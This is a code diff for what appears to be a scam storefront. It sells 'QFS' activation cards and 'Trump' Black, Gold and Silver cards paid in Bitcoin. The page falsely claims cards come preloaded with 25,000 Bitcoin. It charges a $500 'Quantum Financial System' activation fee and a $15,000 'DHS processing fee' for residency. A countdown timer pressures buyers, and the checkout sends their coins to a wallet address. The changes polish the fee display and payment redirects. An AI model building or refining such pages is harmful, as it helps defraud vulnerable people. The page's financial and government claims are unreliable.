@@ -67,6 +67,7 @@ body {
   border:1px solid rgba(148,163,184,0.45);
   cursor:pointer;
   transition:0.25s;
+  position:relative;
 }
 .card-view:hover {
   transform:scale(1.08);
@@ -75,6 +76,8 @@ body {
 
 .card-img {
   width:100%;
+  height:100%;
+  object-fit:cover;
   border-radius:18px;
   border:3px solid transparent;
   transition:0.25s;
@@ -85,14 +88,99 @@ body {
 }
 
 /* QFS Card specific style */
-.card-view.qfs-card {
-  border-color: var(--qfs);
-  background: linear-gradient(145deg, rgba(139,92,246,0.15), rgba(56,189,248,0.15));
+.qfs-card-design {
+  width:100%;
+  height:100%;
+  background: linear-gradient(145deg, #2a1b3d, #1a0b2e);
+  border-radius:18px;
+  border:2px solid var(--qfs);
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  position:relative;
+  overflow:hidden;
 }
+
+.qfs-card-design::before {
+  content:"";
+  position:absolute;
+  top:-50%;
+  left:-50%;
+  width:200%;
+  height:200%;
+  background: conic-gradient(from 0deg, transparent, var(--qfs), transparent 30%);
+  animation: rotate 4s linear infinite;
+  opacity:0.3;
+}
+
+@keyframes rotate {
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
+}
+
+.qfs-chip {
+  width:30px;
+  height:22px;
+  background: linear-gradient(135deg, #ffd700, #b8860b);
+  border-radius:4px;
+  margin-bottom:8px;
+  position:relative;
+  z-index:2;
+}
+
+.qfs-chip::after {
+  content:"";
+  position:absolute;
+  top:2px;
+  left:2px;
+  right:2px;
+  bottom:2px;
+  background: repeating-linear-gradient(45deg, transparent, transparent 2px, rgba(0,0,0,0.2) 2px, rgba(0,0,0,0.2) 4px);
+  border-radius:2px;
+}
+
+.qfs-text {
+  font-size:14px;
+  font-weight:bold;
+  color:var(--qfs);
+  text-shadow:0 0 10px var(--qfs);
+  margin-bottom:4px;
+  position:relative;
+  z-index:2;
+}
+
+.qfs-badge {
+  font-size:8px;
+  color:var(--text);
+  background:rgba(139,92,246,0.3);
+  padding:2px 6px;
+  border-radius:999px;
+  border:1px solid var(--qfs);
+  position:relative;
+  z-index:2;
+}
+
+.qfs-fee {
+  font-size:10px;
+  color:#fbbf24;
+  margin-top:4px;
+  position:relative;
+  z-index:2;
+}
+
+.card-view.qfs-card {
+  background: transparent;
+  border: none;
+  overflow: visible;
+}
+
 .card-view.qfs-card:hover {
+  transform:scale(1.08);
   box-shadow:0 0 22px var(--qfs);
 }
-.card-img.qfs-selected {
+
+.card-view.qfs-card.selected .qfs-card-design {
   border:3px solid var(--qfs);
   box-shadow:0 0 28px var(--qfs);
 }
@@ -228,25 +316,32 @@ select {
   <div class="visual">
 
     <div class="card-row">
-      <!-- QFS Card -->
+      <!-- QFS Card with Real Design -->
       <div class="card-view qfs-card" data-type="qfs">
-        <div style="text-align:center; padding:10px;">
-          <span style="font-size:32px;">🔷</span>
-          <div style="font-size:12px; font-weight:bold; color:#8b5cf6; margin-top:5px;">QFS ACCOUNT</div>
-          <div style="font-size:10px; color:#e2e8f0;">Activation Card</div>
+        <div class="qfs-card-design">
+          <div class="qfs-chip"></div>
+          <div class="qfs-text">QFS</div>
+          <div class="qfs-badge">ACTIVATION</div>
+          <div class="qfs-fee">$500 FEE</div>
         </div>
       </div>
 
+      <!-- Black Card -->
       <div class="card-view" data-type="black">
-        <img class="card-img" src="https://raw.githubusercontent.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/main/BlackCard.png">
+        <img class="card-img" src="https://raw.githubusercontent.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/main/BlackCard.png" 
+             onerror="this.src='https://via.placeholder.com/170x110/000000/ffffff?text=BLACK+CARD'">
       </div>
 
+      <!-- Gold Card -->
       <div class="card-view" data-type="gold">
-        <img class="card-img" src="https://raw.githubusercontent.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/main/GoldCard.png">
+        <img class="card-img" src="https://raw.githubusercontent.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/main/GoldCard.png"
+             onerror="this.src='https://via.placeholder.com/170x110/ffd700/000000?text=GOLD+CARD'">
       </div>
 
+      <!-- Silver Card -->
       <div class="card-view" data-type="silver">
-        <img class="card-img" src="https://raw.githubusercontent.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/main/SilverCard.png">
+        <img class="card-img" src="https://raw.githubusercontent.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/main/SilverCard.png"
+             onerror="this.src='https://via.placeholder.com/170x110/c0c0c0/000000?text=SILVER+CARD'">
       </div>
     </div>
 
@@ -300,28 +395,29 @@ document.addEventListener('DOMContentLoaded', function() {
   const QFS_ACTIVATION_FEE = 500;
 
   const CARD_TITLES = {
-    qfs: "QFS Account Activation",
+    qfs: "QFS Account Activation Card",
     black: "Trump Black Card — 25,000 Bitcoin",
     gold: "Trump Gold Card — Unlock life in America",
     silver: "Trump Silver Card — $25,000 worth of bitcoin"
   };
 
   const CARD_DESCS = {
-    qfs: "Activate your Quantum Financial System account with this card order. Includes a one-time $500 activation fee.",
-    black: "High-weight elite matte finish with premium chain security.",
+    qfs: "Premium Quantum Financial System activation card with embedded security chip. Includes one-time $500 activation fee for full QFS account access.",
+    black: "High-weight elite matte finish with premium chain security. Comes preloaded with 25,000 Bitcoin.",
     gold: `For a $15,000 DHS processing fee and, after background approval, a contribution of $1 million, receive U.S. residency in record time with the Trump Gold Card.<br> Upon completion and receipt of payment, individuals will need to complete the Department of Homeland Security I-140G to commence vetting. The form is available here.<br><br>
           <a href="${GOLD_REQUIRED_FORM}" target="_blank" style="color:#38bdf8;">View Form</a>`,
-    silver: "Premium stainless-steel card with essential blockchain benefits."
+    silver: "Premium stainless-steel card with essential blockchain benefits. Preloaded with $25,000 worth of Bitcoin."
   };
 
   const CARD_PERKS = {
     qfs: [
-      "🔷 QFS Account Activation",
-      "✅ Access to Quantum Financial System",
-      "💳 Physical card included",
-      "🔒 Enhanced security features",
-      "🌐 Global acceptance",
-      "⚡ Instant activation upon delivery"
+      "🔷 Full QFS Account Activation",
+      "💳 Premium metal card with holographic chip",
+      "✅ Instant account access upon delivery",
+      "🔒 Military-grade encryption",
+      "🌐 Global quantum financial system access",
+      "⚡ Priority customer support",
+      "📱 Mobile app integration"
     ],
     black: [
       "Black matte + gold elite finish",
@@ -397,7 +493,7 @@ document.addEventListener('DOMContentLoaded', function() {
         <div>
           <strong style="color: #8b5cf6; font-size: 18px;">QFS Account Activation Required</strong>
           <p style="color: #e2e8f0; margin: 4px 0 0 0; font-size: 14px;">
-            Your QFS account is pending activation. Order the QFS card below to activate your account.
+            Your QFS account is pending activation. Order the QFS activation card below to activate your account.
           </p>
           <p style="color: #fbbf24; margin: 8px 0 0 0; font-size: 13px;">
             Status: ${qfsAccountData?.account_status || 'pending_activation'} 
@@ -430,17 +526,29 @@ document.addEventListener('DOMContentLoaded', function() {
   /* Quantity change handler */
   qtyEl.addEventListener("change", updateTotals);
 
-  /* BTC Price fetch */
+  /* BTC Price fetch - FIXED: Now always tries to fetch and updates UI */
   async function fetchBtcPrice() {
     try {
       const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd");
       const j = await r.json();
       currentBtcPrice = j.bitcoin.usd;
       btcPriceLine.innerText = "BTC Price: $" + currentBtcPrice.toLocaleString();
-      if (selectedCard) updateTotals();
-    } catch {}
+      if (selectedCard) {
+        updateTotals();
+      } else {
+        // Update display even if no card selected
+        btcPriceLine.innerText = "BTC Price: $" + currentBtcPrice.toLocaleString();
+      }
+    } catch (error) {
+      console.log('BTC price fetch failed, using fallback');
+      currentBtcPrice = 50000; // Fallback price
+      btcPriceLine.innerText = "BTC Price: ~$50,000 (estimated)";
+    }
   }
+  
+  // Fetch BTC price immediately and every 60 seconds
   fetchBtcPrice();
+  setInterval(fetchBtcPrice, 60000);
 
   /* Countdown timer */
   const END_KEY = "timer_v5";
@@ -490,27 +598,33 @@ document.addEventListener('DOMContentLoaded', function() {
     }
   }
 
-  /* Update price totals */
+  /* Update price totals - FIXED: Now properly updates BTC for all cards */
   function updateTotals() {
     if (!selectedCard) return;
     
     let cardPrice = 0;
+    let displayText = "";
+    
     if (selectedCard === "qfs") {
-      cardPrice = 0; // QFS card itself is free, just pay activation fee
+      cardPrice = QFS_ACTIVATION_FEE;
+      displayText = "$" + cardPrice.toLocaleString() + " (activation fee)";
     } else if (selectedCard === "gold") {
       cardPrice = GOLD_PROCESSING_FEE;
+      displayText = "$" + cardPrice.toLocaleString();
     } else {
       cardPrice = (Date.now() >= endTs ? INCREASED_PRICES : BASE_PRICES)[selectedCard] * Number(qtyEl.value);
+      displayText = "$" + cardPrice.toLocaleString();
     }
 
-    // For QFS users, show total with activation fee
-    if (selectedCard === "qfs") {
-      const totalWithFee = QFS_ACTIVATION_FEE;
-      totalUSDEl.innerText = "$" + totalWithFee.toLocaleString() + " (includes $500 fee)";
-      totalBTCEle.innerText = currentBtcPrice ? (totalWithFee / currentBtcPrice).toFixed(8) + " BTC" : "0 BTC";
+    // Update USD display
+    totalUSDEl.innerText = displayText;
+    
+    // Update BTC display if price is available
+    if (currentBtcPrice && currentBtcPrice > 0) {
+      const btcAmount = (cardPrice / currentBtcPrice).toFixed(8);
+      totalBTCEle.innerText = btcAmount + " BTC";
     } else {
-      totalUSDEl.innerText = "$" + cardPrice.toLocaleString();
-      totalBTCEle.innerText = currentBtcPrice ? (cardPrice / currentBtcPrice).toFixed(8) + " BTC" : "0 BTC";
+      totalBTCEle.innerText = "Loading BTC price...";
     }
   }
 
@@ -525,25 +639,17 @@ document.addEventListener('DOMContentLoaded', function() {
   /* Card click handler */
   cardViews.forEach(view => {
     const type = view.dataset.type;
-    let img = view.querySelector(".card-img");
 
     view.addEventListener("click", function(e) {
       e.preventDefault();
       
       // Remove selected class from all cards
-      document.querySelectorAll(".card-img").forEach(x => {
-        if (x) x.classList.remove("selected");
-      });
       document.querySelectorAll(".card-view").forEach(v => {
-        v.classList.remove("qfs-card");
+        v.classList.remove("selected");
       });
       
       // Add selected class to clicked card
-      if (type === 'qfs') {
-        view.classList.add("qfs-card");
-      } else if (img) {
-        img.classList.add("selected");
-      }
+      view.classList.add("selected");
 
       // Fade out center message
       centerMessage.classList.add("fade-out");
@@ -585,14 +691,14 @@ document.addEventListener('DOMContentLoaded', function() {
 
     let cardPrice = 0;
     if (selectedCard === "qfs") {
-      cardPrice = 0;
+      cardPrice = QFS_ACTIVATION_FEE;
     } else if (selectedCard === "gold") {
       cardPrice = GOLD_PROCESSING_FEE;
     } else {
       cardPrice = (Date.now() >= endTs ? INCREASED_PRICES : BASE_PRICES)[selectedCard] * Number(qtyEl.value);
     }
 
-    let btcValue = currentBtcPrice
+    let btcValue = currentBtcPrice && currentBtcPrice > 0
       ? (cardPrice / currentBtcPrice).toFixed(8)
       : "0.00000000";
 
@@ -610,14 +716,10 @@ document.addEventListener('DOMContentLoaded', function() {
           return;
         }
         
-        // Calculate total with $500 fee
-        const totalUSD = QFS_ACTIVATION_FEE;
-        const totalBTC = currentBtcPrice ? (totalUSD / currentBtcPrice).toFixed(8) : "0.00000000";
-        
-        // Show fee breakdown
+        // Show confirmation
         const confirmMsg = `QFS Account Activation:\n\n` +
           `Activation Fee: $${QFS_ACTIVATION_FEE}\n` +
-          `Total: $${totalUSD.toLocaleString()} (${totalBTC} BTC)\n\n` +
+          `Total: $${cardPrice.toLocaleString()} (${btcValue} BTC)\n\n` +
           `Proceed to payment?`;
           
         if (!confirm(confirmMsg)) {
@@ -626,21 +728,21 @@ document.addEventListener('DOMContentLoaded', function() {
           return;
         }
         
-        // Store order info with fee
+        // Store order info
         localStorage.setItem('qfs_last_order', JSON.stringify({
           card: 'qfs',
           activation_fee: QFS_ACTIVATION_FEE,
-          total: totalUSD,
+          total: cardPrice,
+          btc: btcValue,
           date: new Date().toISOString()
         }));
         
-        // Redirect to payment page with QFS params
+        // Redirect to payment page
         const params = new URLSearchParams({
           type: 'qfs_activation',
           card_type: 'qfs',
-          activation_fee: QFS_ACTIVATION_FEE,
-          total_usd: totalUSD,
-          total_btc: totalBTC,
+          usd: cardPrice,
+          btc: btcValue,
           addr: WALLET_ADDR
         });
 
@@ -652,21 +754,11 @@ document.addEventListener('DOMContentLoaded', function() {
         payNowBtn.textContent = "Pay Now";
         payNowBtn.disabled = false;
       }
-    } else if (selectedCard === "gold") {
-      /* Gold card flow */
-      const params = new URLSearchParams({
-        type: selectedCard,
-        qty: 1,
-        usd: cardPrice,
-        btc: btcValue,
-        addr: WALLET_ADDR
-      });
-      window.location.href = "wallet.html?" + params.toString();
     } else {
-      /* Regular card flow (silver/black) */
+      /* Regular card flow */
       const params = new URLSearchParams({
         type: selectedCard,
-        qty: Number(qtyEl.value),
+        qty: selectedCard === "gold" ? 1 : Number(qtyEl.value),
         usd: cardPrice,
         btc: btcValue,
         addr: WALLET_ADDR
